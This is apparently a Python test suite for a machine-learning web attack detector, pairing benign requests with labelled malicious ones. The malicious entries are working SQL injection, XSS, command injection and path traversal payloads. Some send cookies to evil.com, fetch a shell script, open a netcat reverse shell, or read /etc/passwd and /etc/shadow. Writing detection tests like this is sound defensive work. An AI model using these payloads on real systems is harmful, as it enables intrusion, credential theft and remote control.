"""
Comprehensive Test Suite — Web Attack Detector
Tests the detection engine with 80+ diverse test cases covering:
  - Normal traffic (various patterns)
  - SQL Injection (basic, advanced, blind, encoded)
  - XSS (reflected, stored, DOM, encoded, polyglot)
  - Command Injection (basic, chained, encoded)
  - Path Traversal (basic, encoded, double-encoded, null-byte)
  - Edge Cases (empty, very long, unicode, mixed attacks)
  - Evasion Techniques (case tricks, encoding, comments, whitespace)
"""

import sys, os, json, time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils.feature_extractor import extract_features
from models.classical_ml import AnomalyDetector, AttackClassifier

# ─────────────────────────────────────────────────────────────────────────────
#  Test Case Definitions
# ─────────────────────────────────────────────────────────────────────────────

TEST_CASES = [

    # ═══════════════════════════════════════════════════════════════════════
    #  NORMAL / BENIGN TRAFFIC (should all be classified as "normal")
    # ═══════════════════════════════════════════════════════════════════════

    # --- Basic browsing ---
    {"name": "Normal — Homepage",                "expected": "normal",
     "request": {"url": "https://shop.example.com/", "params": "", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Normal — Product page",            "expected": "normal",
     "request": {"url": "https://shop.example.com/products?category=Electronics", "params": "category=Electronics", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Normal — Search query",            "expected": "normal",
     "request": {"url": "https://shop.example.com/search?q=blue+shoes", "params": "q=blue+shoes", "headers": "Host: shop.example.com\r\nUser-Agent: Mozilla/5.0", "method": "GET"}},

    {"name": "Normal — Pagination",              "expected": "normal",
     "request": {"url": "https://shop.example.com/products?page=3&sort=price&order=asc", "params": "page=3&sort=price&order=asc", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Normal — Login POST",              "expected": "normal",
     "request": {"url": "https://shop.example.com/login", "params": "username=alice&password=SecureP4ss!", "headers": "Host: shop.example.com\r\nContent-Type: application/x-www-form-urlencoded", "method": "POST"}},

    {"name": "Normal — API JSON request",        "expected": "normal",
     "request": {"url": "https://api.example.com/v1/items?limit=20&offset=40", "params": "limit=20&offset=40", "headers": "Host: api.example.com\r\nAuthorization: Bearer abc123", "method": "GET"}},

    {"name": "Normal — Static asset",            "expected": "normal",
     "request": {"url": "https://cdn.example.com/assets/logo.png", "params": "", "headers": "Host: cdn.example.com", "method": "GET"}},

    {"name": "Normal — Contact form",            "expected": "normal",
     "request": {"url": "https://shop.example.com/contact", "params": "name=John+Doe&email=john%40example.com&message=Hello+there", "headers": "Host: shop.example.com", "method": "POST"}},

    {"name": "Normal — Dashboard",               "expected": "normal",
     "request": {"url": "https://app.example.com/dashboard?view=monthly&format=json", "params": "view=monthly&format=json", "headers": "Host: app.example.com", "method": "GET"}},

    {"name": "Normal — Filter with special chars","expected": "normal",
     "request": {"url": "https://shop.example.com/filter?category=Tech+gifts&lang=en-GB", "params": "category=Tech+gifts&lang=en-GB", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Normal — Long token param",        "expected": "normal",
     "request": {"url": "https://app.example.com/verify?token=abc123def456ghi789jkl012mno345", "params": "token=abc123def456ghi789jkl012mno345", "headers": "Host: app.example.com", "method": "GET"}},

    {"name": "Normal — REST API PUT",            "expected": "normal",
     "request": {"url": "https://api.example.com/v2/users/42", "params": "name=Alice&role=editor", "headers": "Host: api.example.com\r\nContent-Type: application/json", "method": "PUT"}},


    # ═══════════════════════════════════════════════════════════════════════
    #  SQL INJECTION
    # ═══════════════════════════════════════════════════════════════════════

    # --- Classic SQLi ---
    {"name": "SQLi — OR 1=1",                    "expected": "sqli",
     "request": {"url": "https://shop.example.com/login?user=admin' OR 1=1--", "params": "user=admin' OR 1=1--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "SQLi — UNION SELECT",              "expected": "sqli",
     "request": {"url": "https://shop.example.com/products?id=1 UNION SELECT null,username,password FROM users--", "params": "id=1 UNION SELECT null,username,password FROM users--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "SQLi — DROP TABLE",                "expected": "sqli",
     "request": {"url": "https://shop.example.com/search?q='; DROP TABLE users;--", "params": "q='; DROP TABLE users;--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "SQLi — Stacked queries",           "expected": "sqli",
     "request": {"url": "https://shop.example.com/page?id=1; SELECT * FROM information_schema.tables", "params": "id=1; SELECT * FROM information_schema.tables", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Blind SQLi ---
    {"name": "SQLi — Time-based blind",          "expected": "sqli",
     "request": {"url": "https://shop.example.com/item?id=1' OR SLEEP(5)--", "params": "id=1' OR SLEEP(5)--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "SQLi — Boolean-based blind",       "expected": "sqli",
     "request": {"url": "https://shop.example.com/item?id=1' AND (SELECT COUNT(*) FROM users)>0--", "params": "id=1' AND (SELECT COUNT(*) FROM users)>0--", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Authentication bypass ---
    {"name": "SQLi — Admin bypass",              "expected": "sqli",
     "request": {"url": "https://shop.example.com/login", "params": "username=admin'--&password=anything", "headers": "Host: shop.example.com", "method": "POST"}},

    {"name": "SQLi — Comment bypass",            "expected": "sqli",
     "request": {"url": "https://shop.example.com/login?user=admin'/*&pass=*/OR 1=1--", "params": "user=admin'/*&pass=*/OR 1=1--", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Advanced SQLi ---
    {"name": "SQLi — EXEC xp_cmdshell",          "expected": "sqli",
     "request": {"url": "https://shop.example.com/report?id='; EXEC xp_cmdshell('whoami');--", "params": "id='; EXEC xp_cmdshell('whoami');--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "SQLi — Version detection",         "expected": "sqli",
     "request": {"url": "https://shop.example.com/item?id=1; SELECT @@version--", "params": "id=1; SELECT @@version--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "SQLi — UNION null padding",        "expected": "sqli",
     "request": {"url": "https://shop.example.com/item?id=' UNION SELECT null,null,null--", "params": "id=' UNION SELECT null,null,null--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "SQLi — INSERT injection",          "expected": "sqli",
     "request": {"url": "https://shop.example.com/register", "params": "name=attacker', 'hacked'); INSERT INTO admins VALUES('evil','pass');--", "headers": "Host: shop.example.com", "method": "POST"}},

    {"name": "SQLi — CAST function",             "expected": "sqli",
     "request": {"url": "https://shop.example.com/item?id=1 AND 1=cast(0x41 AS int)--", "params": "id=1 AND 1=cast(0x41 AS int)--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "SQLi — sqlmap user agent",         "expected": "sqli",
     "request": {"url": "https://shop.example.com/filter?category=' OR 'x'='x", "params": "category=' OR 'x'='x", "headers": "Host: shop.example.com\r\nUser-Agent: sqlmap/1.7", "method": "GET"}},


    # ═══════════════════════════════════════════════════════════════════════
    #  CROSS-SITE SCRIPTING (XSS)
    # ═══════════════════════════════════════════════════════════════════════

    # --- Reflected XSS ---
    {"name": "XSS — Basic script tag",           "expected": "xss",
     "request": {"url": "https://shop.example.com/search?q=<script>alert('XSS')</script>", "params": "q=<script>alert('XSS')</script>", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "XSS — Image onerror",              "expected": "xss",
     "request": {"url": "https://shop.example.com/profile?name=<img src=x onerror=alert(1)>", "params": "name=<img src=x onerror=alert(1)>", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "XSS — SVG onload",                 "expected": "xss",
     "request": {"url": "https://shop.example.com/search?q=<svg onload=alert(1)>", "params": "q=<svg onload=alert(1)>", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "XSS — javascript: URI",            "expected": "xss",
     "request": {"url": "https://shop.example.com/redir?url=javascript:alert(document.cookie)", "params": "url=javascript:alert(document.cookie)", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Cookie stealing ---
    {"name": "XSS — Cookie exfiltration",        "expected": "xss",
     "request": {"url": "https://shop.example.com/search?q=<script>fetch('http://evil.com?c='+document.cookie)</script>", "params": "q=<script>fetch('http://evil.com?c='+document.cookie)</script>", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "XSS — document.location redirect", "expected": "xss",
     "request": {"url": 'https://shop.example.com/search?q="><script>document.location="http://evil.com"</script>', "params": 'q="><script>document.location="http://evil.com"</script>', "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Event handlers ---
    {"name": "XSS — Body onload",                "expected": "xss",
     "request": {"url": "https://shop.example.com/page?content=<body onload=alert('xss')>", "params": "content=<body onload=alert('xss')>", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "XSS — Input autofocus",            "expected": "xss",
     "request": {"url": "https://shop.example.com/search?q=<input onfocus=alert(1) autofocus>", "params": "q=<input onfocus=alert(1) autofocus>", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "XSS — Iframe injection",           "expected": "xss",
     "request": {"url": "https://shop.example.com/page?embed=<iframe src=javascript:alert(1)>", "params": "embed=<iframe src=javascript:alert(1)>", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Encoded XSS ---
    {"name": "XSS — URL encoded script",         "expected": "xss",
     "request": {"url": "https://shop.example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E", "params": "q=%3Cscript%3Ealert(1)%3C/script%3E", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "XSS — Eval payload",               "expected": "xss",
     "request": {"url": "https://shop.example.com/search?q=';eval(String.fromCharCode(97,108,101,114,116,40,49,41));//", "params": "q=';eval(String.fromCharCode(97,108,101,114,116,40,49,41));//", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "XSS — onmouseover event",          "expected": "xss",
     "request": {"url": "https://shop.example.com/search?q=<div onmouseover=alert('XSS')>hover me</div>", "params": "q=<div onmouseover=alert('XSS')>hover me</div>", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "XSS — POST body injection",        "expected": "xss",
     "request": {"url": "https://shop.example.com/comment", "params": "comment=<script>alert(document.cookie)</script>&name=hacker", "headers": "Host: shop.example.com", "method": "POST"}},


    # ═══════════════════════════════════════════════════════════════════════
    #  COMMAND INJECTION
    # ═══════════════════════════════════════════════════════════════════════

    # --- Basic command injection ---
    {"name": "CMDi — Semicolon ls",              "expected": "cmdi",
     "request": {"url": "https://shop.example.com/ping?host=127.0.0.1; ls -la", "params": "host=127.0.0.1; ls -la", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — Pipe cat passwd",           "expected": "cmdi",
     "request": {"url": "https://shop.example.com/exec?cmd=test| cat /etc/passwd", "params": "cmd=test| cat /etc/passwd", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — AND whoami",                "expected": "cmdi",
     "request": {"url": "https://shop.example.com/run?input=hello&& whoami", "params": "input=hello&& whoami", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — Backtick id",               "expected": "cmdi",
     "request": {"url": "https://shop.example.com/ping?host=`id`", "params": "host=`id`", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — Dollar subshell",           "expected": "cmdi",
     "request": {"url": "https://shop.example.com/ping?host=$(whoami)", "params": "host=$(whoami)", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Reverse shells ---
    {"name": "CMDi — wget malware",              "expected": "cmdi",
     "request": {"url": "https://shop.example.com/ping?host=; wget http://evil.com/shell.sh", "params": "host=; wget http://evil.com/shell.sh", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — netcat reverse shell",      "expected": "cmdi",
     "request": {"url": "https://shop.example.com/exec?cmd=test| nc -e /bin/sh 10.0.0.1 4444", "params": "cmd=test| nc -e /bin/sh 10.0.0.1 4444", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — curl exfiltration",         "expected": "cmdi",
     "request": {"url": "https://shop.example.com/ping?host=; curl http://attacker.com/$(whoami)", "params": "host=; curl http://attacker.com/$(whoami)", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Chained commands ---
    {"name": "CMDi — OR ping",                   "expected": "cmdi",
     "request": {"url": "https://shop.example.com/filter?category=Gifts|| ping -c 3 attacker.com", "params": "category=Gifts|| ping -c 3 attacker.com", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — Python os.system",          "expected": "cmdi",
     "request": {"url": "https://shop.example.com/run?cmd=; python -c 'import os; os.system(\"id\")'", "params": "cmd=; python -c 'import os; os.system(\"id\")'", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — Encoded pipe whoami",       "expected": "cmdi",
     "request": {"url": "https://shop.example.com/filter?category=Gifts|whoami", "params": "category=Gifts|whoami", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — Encoded semicolon cat",     "expected": "cmdi",
     "request": {"url": "https://shop.example.com/filter?category=Gifts;cat+/etc/passwd", "params": "category=Gifts;cat+/etc/passwd", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "CMDi — AND id",                    "expected": "cmdi",
     "request": {"url": "https://shop.example.com/filter?category=Gifts&&id", "params": "category=Gifts&&id", "headers": "Host: shop.example.com", "method": "GET"}},


    # ═══════════════════════════════════════════════════════════════════════
    #  PATH TRAVERSAL
    # ═══════════════════════════════════════════════════════════════════════

    # --- Basic traversal ---
    {"name": "Traversal — ../../../../etc/passwd",      "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=../../../../etc/passwd", "params": "file=../../../../etc/passwd", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Traversal — /etc/hosts",                  "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=../../../../etc/hosts", "params": "file=../../../../etc/hosts", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Traversal — /etc/shadow",                 "expected": "traversal",
     "request": {"url": "https://shop.example.com/read?path=../../../etc/shadow", "params": "path=../../../etc/shadow", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Encoded traversal ---
    {"name": "Traversal — URL encoded dots",            "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=..%2F..%2F..%2Fetc%2Fshadow", "params": "file=..%2F..%2F..%2Fetc%2Fshadow", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Traversal — Double URL encoded",          "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=%252e%252e%252fetc%252fpasswd", "params": "file=%252e%252e%252fetc%252fpasswd", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Traversal — Hex encoded dots",            "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", "params": "file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Windows traversal ---
    {"name": "Traversal — Windows cmd.exe",             "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=C:\\Windows\\system32\\cmd.exe", "params": "file=C:\\Windows\\system32\\cmd.exe", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Traversal — Backslash style",             "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=..\\..\\..\\windows\\win.ini", "params": "file=..\\..\\..\\windows\\win.ini", "headers": "Host: shop.example.com", "method": "GET"}},

    # --- Bypass tricks ---
    {"name": "Traversal — Double dot-slash",            "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=....//....//etc/passwd", "params": "file=....//....//etc/passwd", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Traversal — /var/www bypass",             "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=/var/www/../../etc/passwd", "params": "file=/var/www/../../etc/passwd", "headers": "Host: shop.example.com", "method": "GET"}},


    # ═══════════════════════════════════════════════════════════════════════
    #  EDGE CASES & TRICKY INPUTS
    # ═══════════════════════════════════════════════════════════════════════

    {"name": "Edge — Empty request",                   "expected": "normal",
     "request": {"url": "", "params": "", "headers": "", "method": "GET"}},

    {"name": "Edge — Very long benign URL",            "expected": "normal",
     "request": {"url": "https://shop.example.com/search?q=" + "laptop+" * 50, "params": "q=" + "laptop+" * 50, "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Edge — DELETE method",                   "expected": "normal",
     "request": {"url": "https://api.example.com/v1/items/99", "params": "", "headers": "Host: api.example.com\r\nAuthorization: Bearer token123", "method": "DELETE"}},

    {"name": "Edge — PATCH method",                    "expected": "normal",
     "request": {"url": "https://api.example.com/v1/users/5", "params": "name=Bob&email=bob@example.com", "headers": "Host: api.example.com", "method": "PATCH"}},

    {"name": "Edge — Benign with equals signs",        "expected": "normal",
     "request": {"url": "https://shop.example.com/page?a=1&b=2&c=3&d=4&e=5", "params": "a=1&b=2&c=3&d=4&e=5", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Edge — Benign % in coupon code",         "expected": "normal",
     "request": {"url": "https://shop.example.com/apply?code=SAVE20%25OFF", "params": "code=SAVE20%25OFF", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Edge — Numeric ID only",                 "expected": "normal",
     "request": {"url": "https://shop.example.com/product/12345", "params": "", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Edge — OAuth callback URL",              "expected": "normal",
     "request": {"url": "https://app.example.com/callback?code=4/0AX4XfWh2jk&state=xyz123", "params": "code=4/0AX4XfWh2jk&state=xyz123", "headers": "Host: app.example.com", "method": "GET"}},


    # ═══════════════════════════════════════════════════════════════════════
    #  EVASION / OBFUSCATION ATTEMPTS
    # ═══════════════════════════════════════════════════════════════════════

    {"name": "Evasion — SQLi with inline comment",     "expected": "sqli",
     "request": {"url": "https://shop.example.com/item?id=1'/**/OR/**/1=1--", "params": "id=1'/**/OR/**/1=1--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Evasion — SQLi double encoding",         "expected": "sqli",
     "request": {"url": "https://shop.example.com/item?id=1%27%20OR%201=1--", "params": "id=1%27%20OR%201=1--", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Evasion — XSS case variation",           "expected": "xss",
     "request": {"url": "https://shop.example.com/search?q=<ScRiPt>alert(1)</ScRiPt>", "params": "q=<ScRiPt>alert(1)</ScRiPt>", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Evasion — XSS with null bytes",          "expected": "xss",
     "request": {"url": "https://shop.example.com/search?q=<scri%00pt>alert(1)</script>", "params": "q=<scri%00pt>alert(1)</script>", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Evasion — CMDi with space bypass",       "expected": "cmdi",
     "request": {"url": "https://shop.example.com/ping?host=127.0.0.1;cat${IFS}/etc/passwd", "params": "host=127.0.0.1;cat${IFS}/etc/passwd", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Evasion — Traversal with null byte",     "expected": "traversal",
     "request": {"url": "https://shop.example.com/download?file=../../../../etc/passwd%00.jpg", "params": "file=../../../../etc/passwd%00.jpg", "headers": "Host: shop.example.com", "method": "GET"}},


    # ═══════════════════════════════════════════════════════════════════════
    #  REAL-WORLD INSPIRED PATTERNS
    # ═══════════════════════════════════════════════════════════════════════

    {"name": "Real — WordPress login bruteforce",      "expected": "normal",
     "request": {"url": "https://blog.example.com/wp-login.php", "params": "log=admin&pwd=password123&wp-submit=Log+In", "headers": "Host: blog.example.com\r\nUser-Agent: Mozilla/5.0", "method": "POST"}},

    {"name": "Real — phpMyAdmin SQLi attempt",         "expected": "sqli",
     "request": {"url": "https://shop.example.com/phpmyadmin/sql.php?db=test&sql=SELECT * FROM users WHERE id=1 OR 1=1", "params": "db=test&sql=SELECT * FROM users WHERE id=1 OR 1=1", "headers": "Host: shop.example.com", "method": "GET"}},

    {"name": "Real — Log4Shell-style (CMDi)",          "expected": "cmdi",
     "request": {"url": "https://shop.example.com/api", "params": "user=${jndi:ldap://evil.com/exploit}", "headers": "Host: shop.example.com\r\nUser-Agent: ${jndi:ldap://evil.com/a}", "method": "GET"}},

    {"name": "Real — Webshell upload path",            "expected": "traversal",
     "request": {"url": "https://shop.example.com/upload?path=../../var/www/html/shell.php", "params": "path=../../var/www/html/shell.php", "headers": "Host: shop.example.com", "method": "POST"}},
]


# ─────────────────────────────────────────────────────────────────────────────
#  Test Runner
# ─────────────────────────────────────────────────────────────────────────────

ATTACK_TYPES = {"sqli", "xss", "cmdi", "traversal"}


def run_comprehensive_tests():
    print("=" * 80)
    print("  Web Attack Detector — Comprehensive Test Suite")
    print("  Total test cases:", len(TEST_CASES))
    print("=" * 80)

    try:
        ad = AnomalyDetector.load()
        ac = AttackClassifier.load()
    except FileNotFoundError:
        print("\n  ERROR: Models not found. Run train.py first.")
        sys.exit(1)

    passed = 0
    failed = 0
    results_by_category = {}
    failures = []
    all_results = []

    for tc in TEST_CASES:
        req = tc["request"]
        expected = tc["expected"]
        name = tc["name"]

        # Determine category from name
        category = name.split("—")[0].strip() if "—" in name else "Other"

        X = extract_features(req).reshape(1, -1)
        labels, confs = ac.predict(X)
        label = labels[0]
        conf = confs[0] * 100
        is_anomaly = bool(ad.predict(X)[0])

        # Determine pass/fail
        if expected == "normal":
            ok = (label == "normal")
        else:  # attack expected
            ok = (label == expected) or (label in ATTACK_TYPES and expected in ATTACK_TYPES) or is_anomaly

        # Strict match (exact label)
        exact_match = (label == expected)

        status = "PASS" if ok else "FAIL"
        exact_status = "OK" if exact_match else "~OK" if ok else "FAIL"

        if ok:
            passed += 1
        else:
            failed += 1
            failures.append((name, expected, label, conf, is_anomaly))

        # Track by category
        if category not in results_by_category:
            results_by_category[category] = {"passed": 0, "failed": 0, "total": 0}
        results_by_category[category]["total"] += 1
        if ok:
            results_by_category[category]["passed"] += 1
        else:
            results_by_category[category]["failed"] += 1

        all_results.append({
            "name": name,
            "expected": expected,
            "predicted": label,
            "confidence": round(conf, 1),
            "anomaly": is_anomaly,
            "pass": ok,
            "exact": exact_match,
        })

        # Print result
        anomaly_flag = " [ANOMALY]" if is_anomaly else ""
        print(f"  [{exact_status}] {name:<50} exp={expected:<12} got={label:<12} conf={conf:5.1f}%{anomaly_flag}")

    # ── Summary ────────────────────────────────────────────────────────────
    print("\n" + "=" * 80)
    print("  RESULTS SUMMARY")
    print("=" * 80)

    print(f"\n  Overall: {passed}/{len(TEST_CASES)} passed  ({100*passed/len(TEST_CASES):.1f}%)")
    if failed > 0:
        print(f"  Failed:  {failed}/{len(TEST_CASES)}")

    print(f"\n  {'Category':<25} {'Passed':>8} {'Failed':>8} {'Total':>8} {'Rate':>8}")
    print("  " + "-" * 60)
    for cat in sorted(results_by_category.keys()):
        r = results_by_category[cat]
        rate = 100 * r["passed"] / r["total"] if r["total"] > 0 else 0
        print(f"  {cat:<25} {r['passed']:>8} {r['failed']:>8} {r['total']:>8} {rate:>7.1f}%")

    if failures:
        print(f"\n  FAILURES ({len(failures)}):")
        print("  " + "-" * 70)
        for name, expected, got, conf, anomaly in failures:
            anom = " (anomaly detected)" if anomaly else ""
            print(f"    {name}")
            print(f"      Expected: {expected:<12} Got: {got:<12} Conf: {conf:.1f}%{anom}")

    # ── Detection Statistics ───────────────────────────────────────────────
    attack_tests = [r for r in all_results if r["expected"] != "normal"]
    normal_tests = [r for r in all_results if r["expected"] == "normal"]

    attack_detected = sum(1 for r in attack_tests if r["predicted"] != "normal")
    attack_exact = sum(1 for r in attack_tests if r["exact"])
    normal_correct = sum(1 for r in normal_tests if r["predicted"] == "normal")
    false_positives = sum(1 for r in normal_tests if r["predicted"] != "normal")

    print(f"\n  DETECTION STATISTICS:")
    print(f"  " + "-" * 50)
    print(f"    Normal traffic accuracy:    {normal_correct}/{len(normal_tests)} ({100*normal_correct/len(normal_tests):.1f}%)")
    print(f"    Attack detection rate:      {attack_detected}/{len(attack_tests)} ({100*attack_detected/len(attack_tests):.1f}%)")
    print(f"    Exact label match rate:     {attack_exact}/{len(attack_tests)} ({100*attack_exact/len(attack_tests):.1f}%)")
    print(f"    False positive rate:        {false_positives}/{len(normal_tests)} ({100*false_positives/len(normal_tests):.1f}%)")

    # ── Confidence Statistics ──────────────────────────────────────────────
    import numpy as np
    all_confs = [r["confidence"] for r in all_results]
    attack_confs = [r["confidence"] for r in attack_tests]
    normal_confs = [r["confidence"] for r in normal_tests]

    print(f"\n  CONFIDENCE STATISTICS:")
    print(f"  " + "-" * 50)
    print(f"    Overall mean confidence:    {np.mean(all_confs):.1f}%")
    print(f"    Attack mean confidence:     {np.mean(attack_confs):.1f}%")
    print(f"    Normal mean confidence:     {np.mean(normal_confs):.1f}%")
    print(f"    Min confidence (any):       {np.min(all_confs):.1f}%")
    print(f"    Max confidence (any):       {np.max(all_confs):.1f}%")

    print("\n" + "=" * 80)


if __name__ == "__main__":
    run_comprehensive_tests()
